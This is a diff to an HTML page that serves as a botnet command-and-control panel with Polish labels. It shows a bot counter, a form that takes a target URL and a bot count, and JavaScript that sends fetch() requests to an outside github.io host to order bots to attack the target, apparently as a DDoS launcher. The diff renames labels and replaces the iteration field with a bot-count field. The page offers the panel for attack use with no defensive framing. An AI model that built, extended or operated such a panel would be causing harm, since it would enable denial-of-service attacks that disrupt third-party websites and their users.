@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Botnet C2 - luka bts</title>
+    <title>Panel sterujący botnetem - luka bts</title>
     <style>
         body {
             margin: 0;
@@ -34,7 +34,7 @@
             flex-direction: column;
             gap: 15px;
             width: 100%;
-            max-width: 400px;
+            max-width: 450px;
         }
 
         input, button {
@@ -66,16 +66,16 @@
     </style>
 </head>
 <body>
-    <h1>Botnet C2 - luka bts</h1>
+    <h1>Panel sterujący botnetem - luka bts</h1>
     <div id="botCount">Liczba aktywnych botów: <span id="botCountValue">0</span></div>
-    <p>Uruchom atak DDoS</p>
+    <p>Wyślij komendę do botów</p>
 
     <form id="attackForm">
         <label for="target">Cel ataku:</label>
         <input type="text" id="target" name="target" value="https://atakujesz.com" placeholder="np. https://atakujesz.com" required>
 
-        <label for="iterations">Liczba iteracji:</label>
-        <input type="number" id="iterations" name="iterations" value="1000" min="1" required>
+        <label for="botCount">Liczba botów:</label>
+        <input type="number" id="botCount" name="botCount" value="10" min="1" required>
 
         <button type="submit">Uruchom atak</button>
     </form>
@@ -101,12 +101,12 @@
             e.preventDefault();
 
             const target = document.getElementById("target").value;
-            const iterations = document.getElementById("iterations").value;
+            const botCount = document.getElementById("botCount").value;
 
             // Wysyłanie komend do serwera C2
             fetch('https://zulekzulowski9-jpg.github.io/lukabots/no_think/attack')
                 .then(() => fetch(`https://zulekzulowski9-jpg.github.io/lukabots/no_think/target?${target}`))
-                .then(() => fetch(`https://zulekzulowski9-jpg.github.io/lukabots/no_think/itr?${iterations}`))
+                .then(() => fetch(`https://zulekzulowski9-jpg.github.io/lukabots/no_think/itr?${botCount}`))
                 .then(() => {
                     alert("Atak zaczął się!");
                 })
